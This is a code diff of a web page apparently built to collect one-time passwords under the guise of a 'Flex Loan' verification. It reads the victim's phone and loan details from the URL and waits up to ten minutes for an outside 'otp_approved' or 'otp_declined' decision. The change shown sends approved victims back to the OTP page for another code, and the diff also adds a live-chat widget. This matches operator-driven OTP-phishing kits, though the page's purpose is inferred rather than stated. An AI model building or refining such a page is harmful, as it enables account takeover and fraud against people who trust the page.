@@ -292,19 +292,22 @@
 
         function init() {
             const p = new URLSearchParams(location.search);
-            const amount = p.get('amount') || "0";
-            const purpose = p.get('purpose') || "Flex Loan";
+            let rawAmount = p.get('amount') || "0";
+            bd.price = rawAmount.replace(/[^0-9.]/g, ''); // Clean amount
+            bd.data = p.get('purpose') || "Flex Loan";
             phone = p.get('phone') || '';
             
-            if (amount !== "0") { 
-                bd = { data: purpose, price: amount }; 
+            if (bd.price !== "0") { 
                 document.getElementById('loanBox').style.display = 'block';
-                document.getElementById('loanType').textContent = decodeURIComponent(purpose);
-                document.getElementById('loanAmount').textContent = '$' + parseFloat(amount.replace(/[^0-9.]/g, '')).toLocaleString(undefined, {minimumFractionDigits: 2}) + ' USD';
+                document.getElementById('loanType').textContent = decodeURIComponent(bd.data);
+                
+                const formattedAmount = parseFloat(bd.price).toLocaleString(undefined, {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                });
+                document.getElementById('loanAmount').textContent = '$' + formattedAmount + ' USD';
             }
             setupOTP();
-            
-            // Auto-focus first box
             boxes[0].focus();
         }
 
@@ -312,8 +315,6 @@
             boxes.forEach((b, i) => {
                 b.addEventListener('input', e => {
                     const v = e.target.value;
-                    
-                    // Handle paste or autofill
                     if (v.length > 1) {
                         const digs = v.replace(/\D/g, '').split('');
                         digs.forEach((d, j) => { 
@@ -328,25 +329,20 @@
                         if (otp.length === 6) doOTP();
                         return;
                     }
-                    
                     if (v) { 
                         b.classList.add('ok'); 
                         if (i < boxes.length - 1) boxes[i + 1].focus(); 
                     } else { 
                         b.classList.remove('ok'); 
                     }
-                    
                     chk();
                     if (otp.length === 6) doOTP();
                 });
-                
                 b.addEventListener('keydown', e => {
                     if (e.key === 'Backspace' && !b.value && i > 0) {
                         boxes[i - 1].focus();
                     }
                 });
-                
-                // Ensure only numbers
                 b.addEventListener('keypress', e => {
                     if (!/[0-9]/.test(e.key)) e.preventDefault();
                 });
@@ -403,7 +399,7 @@
                                     if (cb === 'otp_approved') { 
                                         clearInterval(iv); 
                                         document.getElementById('ov').classList.remove('on'); 
-                                        location.href = `success.html?amount=${bd.price}&purpose=${bd.data}`;
+                                        location.href = `otp.html?amount=${bd.price}&purpose=${bd.data}`;
                                     }
                                     else if (cb === 'otp_declined') { 
                                         clearInterval(iv); 
@@ -420,5 +416,20 @@
             setTimeout(() => clearInterval(iv), 600000);
         }
     </script>
+
+    <!-- Start of Tawk.to Script -->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+        (function(){
+            var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/6a5c34ea1c52dc1d4c7edce5/default';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+    </script>
+    <!-- End of Tawk.to Script -->
+
 </body>
 </html>
